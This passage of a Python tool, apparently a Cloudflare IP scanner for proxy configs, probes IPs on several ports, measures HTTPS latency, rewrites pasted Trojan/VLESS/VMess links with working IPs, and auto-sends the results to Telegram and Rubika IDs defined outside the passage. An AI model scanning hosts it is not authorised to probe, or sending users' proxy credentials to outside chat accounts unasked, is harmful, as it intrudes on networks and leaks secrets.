    print(Colors.YELLOW + "\n[>] Option 3: Test TCP PORT Only" + Colors.END)
    ips = select_ip_source()

    if not ips:
        print(Colors.RED + "[!] No IPs to test." + Colors.END)
        return

    results = []
    failed_count = 0
    print(Colors.BLUE + "\n[*] Testing different PORTs...\n" + Colors.END)
    print(Colors.BOLD + f"{'IP':<18} | {'PORT':<6} | {'STATUS':<15}" + Colors.END)
    print("-" * 45)

    for ip in ips:
        for port in PORTS_TO_TEST:
            connected = check_ip_port_connection(ip, port)
            if connected:
                status_str = Colors.GREEN + "[WORKING]" + Colors.END
                print(f"{ip:<18} | {port:<6} | {status_str}")
                results.append(f"{ip}:{port}")
            else:
                status_str = Colors.RED + "[FAILED]" + Colors.END
                print(f"{ip:<18} | {port:<6} | {status_str}")
                failed_count += 1

    output = "\n".join(results)
    save_to_file(SAVE_FILENAME, output)

    if results:
        msg = f"Open Ports:\n\n" + output + f"\n\nID: {TELEGRAM_ID} | {RUBIKA_ID}"
        send_all(msg)

    print(Colors.CYAN + f"[SUMMARY] Working: {len(results)} | Failed: {failed_count}" + Colors.END)


def menu_option_4():
    print(Colors.YELLOW + "\n[>] Option 4: Combine Config (Ports: 443, 8443, 80, 2096)" + Colors.END)
    print(Colors.CYAN + "[>] Paste your Cloudflare Config link (Trojan, Vless, Vmess, etc.):" + Colors.END)

    raw_config = input(Colors.BOLD + "Config: " + Colors.END).strip()

    if not raw_config:
        print(Colors.RED + "[!] No config provided." + Colors.END)
        return

    target_domain = extract_sni_from_config(raw_config)

    default_port = 443
    port_match = re.search(r":(\d{2,5})", raw_config)
    if port_match:
        default_port = int(port_match.group(1))

    print(Colors.YELLOW + f"[*] Target SNI/Host domain: '{target_domain}'" + Colors.END)

    ips = select_ip_source()

    if not ips:
        print(Colors.RED + "[!] No IPs to combine." + Colors.END)
        return

    combined_results = []
    print(Colors.BLUE + f"\n[*] Testing {len(ips)} IPs on ports {CONFIG_PORTS_TO_TEST}...\n" + Colors.END)
    print(Colors.BOLD + f"{'IP':<18} | {'PORT':<6} | {'LATENCY':<10} | {'STATUS'}" + Colors.END)
    print("-" * 55)

    for ip in ips:
        passed = False

        latency = check_ip_http_latency(ip, port=default_port, domain=target_domain, timeout=2.5)
        if latency is not None:
            new_conf = replace_ip_and_port_in_config(raw_config, ip, default_port)
            combined_results.append((new_conf, latency))
            print(f"{ip:<18} | {default_port:<6} | {Colors.GREEN}{latency}ms{Colors.END:<10} | {Colors.GREEN}[PASSED]{Colors.END}")
            passed = True
        else:
            for alt_port in CONFIG_PORTS_TO_TEST:
                if alt_port == default_port:
                    continue
                alt_latency = check_ip_http_latency(ip, port=alt_port, domain=target_domain, timeout=2.0)
                if alt_latency is not None:
                    new_conf = replace_ip_and_port_in_config(raw_config, ip, alt_port)
                    combined_results.append((new_conf, alt_latency))
                    print(f"{ip:<18} | {alt_port:<6} | {Colors.GREEN}{alt_latency}ms{Colors.END:<10} | {Colors.GREEN}[PASSED]{Colors.END}")
                    passed = True
                    break

        if not passed:
            print(f"{ip:<18} | {default_port:<6} | {'N/A':<10} | {Colors.RED}[FAILED]{Colors.END}")

    if combined_results:
        combined_results.sort(key=lambda x: x[1])
        output = "\n".join([item[0] for item in combined_results])

        save_filepath = os.path.join(DOWNLOAD_DIR, "combined_configs.txt")
        save_to_file(save_filepath, output)

        msg = f"Tested Working Configs:\n\n" + output + f"\n\nID Telegram: {TELEGRAM_ID}\nID Rubika: {RUBIKA_ID}"
        send_all(msg)

        print(Colors.CYAN + f"\n[SUMMARY] Created {len(combined_results)} working configs & sent successfully!" + Colors.END)
    else:
        print(Colors.RED + "\n[!] No working Cloudflare IPs passed the test on selected ports." + Colors.END)


def main_menu():
    while True:
        print_banner()
        print(Colors.CYAN + """
 ╔══════════════════════════════════════════════════════════════════╗
 ║  [1] Test IP Health via Domain (Real HTTPS Latency)            ║
 ║  [2] Test IP and PORT with Latency Table                        ║
 ║  [3] Test TCP PORT Only                                         ║
 ║  [4] Combine Config (Auto Send to Telegram & Rubika)            ║
 ║  [0] Exit                                                       ║
 ╚══════════════════════════════════════════════════════════════════╝
""" + Colors.END)

        choice = get_clean_input(Colors.BOLD + "[>] Select option: " + Colors.END)

        if choice == "1":
            menu_option_1()
        elif choice == "2":
            menu_option_2()
        elif choice == "3":
            menu_option_3()
        elif choice == "4":
            menu_option_4()
        elif choice == "0":
            print(Colors.YELLOW + "[*] Exiting..." + Colors.END)
            sys.exit(0)
        else:
            print(Colors.RED + "[!] Invalid option." + Colors.END)

        input(Colors.BOLD + "\n[*] Press Enter to continue..." + Colors.END)
        os.system("clear")


if __name__ == "__main__":
    main_menu()
